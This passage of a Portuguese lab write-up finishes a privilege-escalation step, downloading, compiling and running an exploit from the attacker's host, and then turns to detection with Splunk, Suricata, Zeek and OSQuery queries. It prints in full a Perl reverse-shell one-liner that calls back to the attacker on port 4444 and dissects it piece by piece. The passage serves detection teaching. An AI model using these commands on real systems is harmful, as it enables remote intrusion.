width="939" height="402" class="img_ev3q"></p><p>Voltando a console que ganhamos acesso com o usu√°rio www-data, vamos baixar o exploit.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token function" style="color:rgb(80, 250, 123)">wget</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.56.109/37292.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">cd</span><span class="token plain"> tmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gcc </span><span class="token number">37292</span><span class="token plain">.c -o salve</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./salve</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">whoami</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Shell Web Server"}</p><p><img loading="lazy" alt="salve" src="/assets/images/salve-77fe455fd5f76f8124b30ea6063a1b17.png" width="674" height="220" class="img_ev3q"></p><p>Aqui √© o fim da explora√ß√£o, vamos ao lado azul da for√ßa ver o que foi loggado ao longo do processo. </p><h1>Detect</h1><p>Vou me basear no Mitre ATT&amp;CK para descrever a t√©cnica usada, e no cyber kill chain para descrever os momentos do ataque. Clique na imagem abaixo para verificar o gr√°fico.</p><p><img loading="lazy" alt="DectEng.png" src="/assets/images/DectEng-16f9cacdfa7925b95d9bf6b52bb424c9.png" width="1353" height="699" class="img_ev3q"></p><ul><li>A curva vai de T‚ÇÄ/M‚ÇÄ √° M’¢/T’¢;</li><li>Observe que para cada tempo T‚Çõ, temos diferentes capacidades de detec√ß√£o variando de acordo com a ferramenta que registra aquele momento M‚Çõ do atacante.</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan">Detecting Scan<a href="#detecting-scan" class="hash-link" aria-label="Link direto para Detecting Scan" title="Link direto para Detecting Scan">‚Äã</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan---suricata">Detecting Scan - Suricata<a href="#detecting-scan---suricata" class="hash-link" aria-label="Link direto para Detecting Scan - Suricata" title="Link direto para Detecting Scan - Suricata">‚Äã</a></h3><p>A seguinte search poderia ser feita para identificar quais origens tem feito comunica√ß√£o com o web server e quais alertas foram gerados pelo Suricata.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">index</span><span class="token operator">=</span><span class="token operator">*</span><span class="token plain"> dest_ip</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"192.168.56.210"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token operator">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">src_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dest_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dest_port</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">app_proto</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">alert</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">signature</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">by</span><span class="token plain"> src_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> alert</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">category</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Splunk Search"}</p><p><img loading="lazy" alt="suricata" src="/assets/images/suricataXnmap-39389ce00ec333137a75d501142e00af.png" width="1912" height="593" class="img_ev3q">
<em>clique na imagem para expandir</em></p><blockquote><p>Existem outros logs de quando eu ainda estava testando o laborat√≥rio, mas a explora√ß√£o foi feita pelo IP final .109. </p></blockquote><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan---zeek">Detecting Scan - Zeek<a href="#detecting-scan---zeek" class="hash-link" aria-label="Link direto para Detecting Scan - Zeek" title="Link direto para Detecting Scan - Zeek">‚Äã</a></h3><p>Com as informa√ß√µes da busca anterior, podemos ver com quantos bytes foram trafegados entre os hosts:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">index</span><span class="token operator">=</span><span class="token operator">*</span><span class="token plain">  id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">orig_h</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"192.168.56.109"</span><span class="token plain"> id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">resp_h</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"192.168.56.210"</span><span class="token plain"> sourcetype</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"zeek:json"</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token operator">|</span><span class="token plain"> bin span</span><span class="token operator">=</span><span class="token number">3</span><span class="token plain">min _time </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token operator">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">orig_h</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">resp_h</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">resp_p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sum</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">orig_ip_bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sum</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">resp_ip_bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">by</span><span class="token plain"> _time</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Splunk Search"}</p><p><img loading="lazy" alt="zeek" src="/assets/images/suricataXnmap-39389ce00ec333137a75d501142e00af.png" width="1912" height="593" class="img_ev3q">
<em>clique na imagem para expandir</em></p><p>Vemos um volume absurdo de varia√ß√£o de portas destino e tamb√©m dos bytes trafegados.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-exploit">Detecting Exploit<a href="#detecting-exploit" class="hash-link" aria-label="Link direto para Detecting Exploit" title="Link direto para Detecting Exploit">‚Äã</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-proftp-exploit---splunk">Detecting ProFTP Exploit - Splunk<a href="#detecting-proftp-exploit---splunk" class="hash-link" aria-label="Link direto para Detecting ProFTP Exploit - Splunk" title="Link direto para Detecting ProFTP Exploit - Splunk">‚Äã</a></h3><p>Pelos logs do apache podemos buscar pelo IP do atacante e separar as requisi√ß√µes pelo c√≥digo de retorno.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">index</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"syslog"</span><span class="token plain"> Hostname</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"192.168.56.109"</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token operator">|</span><span class="token plain"> eval decodedHTTPURL</span><span class="token operator">=</span><span class="token plain">urldecode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">HTTPURL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token operator">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">HTTPMethod</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">decodedHTTPURL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">by</span><span class="token plain"> HTTPResponseStatus</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> HTTPUserAgent</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Splunk Search"}</p><p><img loading="lazy" alt="apacheperl" src="/assets/images/apache_perl-f41a1c5b9d9b0161d37108ccc2c1b7f6.png" width="1899" height="867" class="img_ev3q"></p><p>Encontramos a requisi√ß√£o maliciosa.</p><p>Pelos logs do zeek, temos evidencias das conex√µes na porta 4444, confirmando o sucesso <strong>de rede</strong> da requisi√ß√£o acima.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">index</span><span class="token operator">=</span><span class="token operator">*</span><span class="token plain">  id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">orig_h</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"192.168.56.109"</span><span class="token plain"> id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">resp_h</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"192.168.56.210"</span><span class="token plain"> id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">resp_p</span><span class="token operator">=</span><span class="token number">4444</span><span class="token plain"> sourcetype</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"zeek:json"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token operator">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">orig_h</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">resp_h</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">values</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">resp_p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sum</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">orig_ip_bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sum</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">resp_ip_bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">by</span><span class="token plain"> _time</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Splunk Search"}</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-proftp-exploit---osquery">Detecting ProFTP Exploit - OSQuery<a href="#detecting-proftp-exploit---osquery" class="hash-link" aria-label="Link direto para Detecting ProFTP Exploit - OSQuery" title="Link direto para Detecting ProFTP Exploit - OSQuery">‚Äã</a></h3><p>Agora √° n√≠vel de m√°quina, podemos verificar no OSQuery quais os efeitos do exploit.
Busquei primeiro pelos processos criados que possuem um command line com o IP do atacante.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> processes </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">where</span><span class="token plain"> cmdline </span><span class="token operator">LIKE</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'%192.168.56.109%'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="OSQuery Search"}
<img loading="lazy" alt="osquery-perl.png" src="/assets/images/osquery-perl-7c431467a23b4067296b942f6f3a9398.png" width="1887" height="606" class="img_ev3q"></p><p>Como uma conex√£o foi estabelecida anteriormente, busquei por sockets abertos com o IP do atacante tamb√©m:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> process_open_sockets </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">where</span><span class="token plain"> remote_address </span><span class="token operator">=</span><span class="token plain">  </span><span class="token string" style="color:rgb(255, 121, 198)">'192.168.56.109'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="OSQuery Search"}</p><p><img loading="lazy" alt="osquery-socketremotaddr.png" src="/assets/images/osquery-socketremotaddr-6b0fba5445b9c1e729404aca42372538.png" width="1902" height="582" class="img_ev3q"></p><p>Vamos ao estudo do que aconteceu. Quebrando o payload original em partes, e entendendo cada uma delas. O payload executado foi o seguinte:</p><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.56.109:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};' &amp;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Payload malicioso"}</p><ol><li>Esse payload cria um fork (processo filho);</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$p=fork;exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="2"><li>Manipula as vari√°veis de ambiente;</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">if($p);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  foreach my $key(keys %ENV){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    if($ENV{$key}=~/(.*)/){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    $ENV{$key}=$1;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="3"><li>Cria uma vari√°vel <code>$c</code>, que cria um socket de rede com o Kali;</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$c=new IO::Socket::INET(PeerAddr,"192.168.56.109:4444");</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="4"><li>O fork le a entrada(<code>STDIN</code>) que digitar-mos, e escreve a sa√≠da (<code>$~</code>) no socket <code>$c</code> por meio de um redirecionamento, isso tudo em looping, fazendo parecer um shell interativo.</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">STDIN-&gt;fdopen($c,r);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$~-&gt;fdopen($c,w);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">while(&lt;&gt;){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  if($_=~ /(.*)/){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  system $1;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 